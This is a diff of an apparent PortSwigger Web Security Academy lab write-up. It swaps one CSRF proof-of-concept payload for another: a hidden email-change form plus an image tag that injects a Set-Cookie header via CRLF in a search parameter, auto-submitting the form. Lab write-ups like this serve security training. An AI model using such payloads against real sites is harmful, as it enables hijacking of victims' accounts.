@@ -70,15 +70,14 @@ Set-Cookie: csrfKey=8nGytpCcjoFz0hFqIMadgRePIv6SxBVR;
 ```
 ```bash
 # Payload:
+# It took my hours to complete this lab due to weird gmail bug on this lab keep changing gmail if the code doesn't work on you.
 <html>
-  <body>
-    <form action="https://0ade00db045f735c839364a700b50063.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="virus@gmail.com" />
-      <input type="hidden" name="csrf" value="ysPJNQhBobfGOOZtWSnIVTmh9GgKUfDg" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <img src="https://0ade00db045f735c839364a700b50063.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=8nGytpCcjoFz0hFqIMadgRePIv6SxBVR" onerror="document.forms[0].submit()">
-  </body>
+ <body>
+  <form action="https://0ad500450313b2a5806e802f0019000c.web-security-academy.net/my-account/change-email" method="POST">
+   <input type="hidden" name="email" value="fla@gmail.com"/>
+   <input type="hidden" name="csrf" value="JFNNHwDTvy3tmj6hox1LkSQm9jA2TZe8"/>
+  </form>
+ </body>
+<img src="https://0ad500450313b2a5806e802f0019000c.web-security-academy.net/?search=blabla%0d%0aSet-Cookie%3a%20csrfKey=qgrDl0pW6UVb252z2lzrnn7xvxRIg3rj%3b%20SameSite=None" onerror="document.forms[0].submit()">
 </html>
-
 ```
